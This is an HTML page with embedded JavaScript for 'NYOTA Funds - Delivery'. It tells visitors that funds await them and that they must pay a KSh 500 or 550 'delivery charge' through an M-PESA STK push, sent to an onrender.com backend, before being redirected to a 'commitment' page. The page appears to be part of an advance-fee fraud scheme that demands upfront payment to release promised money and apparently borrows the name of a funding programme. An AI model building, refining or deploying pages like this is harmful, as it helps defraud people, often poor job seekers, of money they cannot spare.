<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="theme-color" content="#087f32">
<title>NYOTA Funds - Delivery</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial,sans-serif;
}

body{
    min-height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    padding:20px;
    background:
        radial-gradient(circle at 10% 10%, rgba(34,197,94,.35), transparent 28%),
        radial-gradient(circle at 90% 90%, rgba(59,130,246,.35), transparent 28%),
        linear-gradient(135deg,#064e3b,#1e40af);
    color:#fff;
}

.container{
    width:100%;
    max-width:460px;
}

.card{
    background:rgba(255,255,255,.10);
    backdrop-filter:blur(15px);
    border:1px solid rgba(255,255,255,.15);
    border-radius:22px;
    padding:24px;
    box-shadow:0 20px 60px rgba(0,0,0,.35);
}

h1{
    text-align:center;
    margin-bottom:10px;
    font-size:26px;
}

.subtitle{
    text-align:center;
    color:rgba(255,255,255,.78);
    margin-bottom:24px;
    line-height:1.5;
}

.delivery-option{
    display:flex;
    gap:12px;
    align-items:flex-start;
    padding:16px;
    border-radius:14px;
    border:2px solid rgba(255,255,255,.12);
    background:rgba(255,255,255,.05);
    margin-bottom:14px;
    cursor:pointer;
    transition:.2s;
}

.delivery-option:hover{
    border-color:#16a34a;
}

.delivery-option input{
    margin-top:4px;
    accent-color:#16a34a;
}

.method{
    font-weight:bold;
    font-size:16px;
}

.fee{
    margin-top:5px;
    color:rgba(255,255,255,.72);
    font-size:14px;
}

.selected-fee{
    margin:20px 0;
    padding:16px;
    border-radius:12px;
    background:rgba(22,163,74,.12);
    border:1px solid rgba(22,163,74,.25);
    text-align:center;
    font-size:18px;
}

button{
    width:100%;
    padding:16px;
    border:none;
    border-radius:12px;
    background:linear-gradient(135deg,#16a34a,#087f32);
    color:#fff;
    font-size:17px;
    font-weight:bold;
    cursor:pointer;
}

button:hover{
    background:linear-gradient(135deg,#1db954,#0b7a2f);
}

button:disabled{
    opacity:.6;
    cursor:not-allowed;
}

#status{
    min-height:24px;
    margin-top:18px;
    text-align:center;
    font-size:14px;
    line-height:1.5;
}

.success{color:#7ef0aa;}
.error{color:#ff8d96;}

.footer{
    text-align:center;
    margin-top:18px;
    font-size:12px;
    color:rgba(255,255,255,.55);
}
</style>
</head>

<body>

<div class="container">

<div class="card">

<h1>Funds Delivery</h1>

<p class="subtitle">

            Kindly choose where you would like your funds transferred.
            Each delivery method has a small fee to cover applicable
            network and processing charges
</p>

<label class="delivery-option">
<input type="radio" name="delivery" value="500">
<div>
<div class="method">📱 Mobile Money</div>
<div class="fee">Delivery charge: KSh 500</div>
</div>
</label>

<label class="delivery-option">
<input type="radio" name="delivery" value="550">
<div>
<div class="method">🏦 Bank Account</div>
<div class="fee">Delivery charge: KSh 550</div>
</div>
</label>

<div class="selected-fee">
Delivery Fee: <strong>KSh <span id="deliveryFee">0</span></strong>
</div>

<button id="payButton">Pay Delivery Charges</button>

<div id="status"></div>

</div>

<div class="footer">
Secure NYOTA Funds Delivery
</div>

</div>

<script>
"use strict";

const BACKEND_URL="https://nyota-program-backend.onrender.com";

const deliveryFee=document.getElementById("deliveryFee");
const payButton=document.getElementById("payButton");
const statusElement=document.getElementById("status");

document.querySelectorAll('input[name="delivery"]').forEach(input=>{
    input.addEventListener("change",()=>{
        deliveryFee.textContent=Number(input.value).toLocaleString("en-KE");
    });
});

function setStatus(message,type=""){
    statusElement.textContent=message;
    statusElement.className=type;
}

function setLoading(loading,text="Processing..."){
    payButton.disabled=loading;
    payButton.textContent=loading?text:"Pay Delivery Charges";
}

async function readJson(response){
    const text=await response.text();
    return text?JSON.parse(text):{};
}

async function payDelivery(){

    const selected=document.querySelector('input[name="delivery"]:checked');

    if(!selected){
        setStatus("Please select a delivery method.","error");
        return;
    }

    const phone=localStorage.getItem("phoneNumber");

    if(!phone){
        setStatus("Phone number not found. Return to the payment page.","error");
        return;
    }

    const amount=Number(selected.value);

    localStorage.setItem(
        "deliveryMethod",
        amount===500?"Mobile Money":"Bank Account"
    );

    localStorage.setItem("deliveryFee",amount);

    setLoading(true,"Sending STK Push...");
    setStatus("Sending payment request...");

    try{

        const response=await fetch(BACKEND_URL+"/stk-push",{
            method:"POST",
            headers:{
                "Content-Type":"application/json"
            },
            body:JSON.stringify({
                phone,
                amount
            })
        });

        const data=await readJson(response);

        if(!response.ok||!data.success){
            throw new Error(data.message||"Payment request failed.");
        }

        const transactionId=
            data.transactionId||
            data.checkout_request_id||
            data.data?.transactionId||
            data.data?.checkout_request_id;

        setLoading(true,"Waiting for payment...");
        setStatus("M-PESA prompt sent. Enter your PIN.");

        await checkPayment(transactionId);

    }catch(error){

        setStatus(error.message,"error");
        setLoading(false);

    }
}

async function checkPayment(transactionId){

    const started=Date.now();

    while(Date.now()-started<120000){

        try{

            const response=await fetch(BACKEND_URL+"/payment-status",{
                method:"POST",
                headers:{
                    "Content-Type":"application/json"
                },
                body:JSON.stringify({transactionId})
            });

            const result=await readJson(response);

            const payment=result.data||result;

            const status=String(payment.status||"").toUpperCase();

            if(["SUCCESS","COMPLETED","CONFIRMED"].includes(status)){

                setStatus("Payment confirmed. Redirecting...","success");

                setTimeout(()=>{
                    window.location.href="commitment.html";
                },1000);

                return;
            }

            if(["FAILED","CANCELLED","EXPIRED"].includes(status)){
                throw new Error("Payment "+status.toLowerCase()+".");
            }

        }catch(error){

            if(/failed|cancelled|expired/i.test(error.message)){
                setStatus(error.message,"error");
                setLoading(false);
                return;
            }

        }

        await new Promise(r=>setTimeout(r,3000));
    }

    setStatus(
        "We could not confirm the payment in time. Check your M-PESA messages.",
        "error"
    );

    setLoading(false);
}

payButton.addEventListener("click",payDelivery);
</script>

</body>
</htm
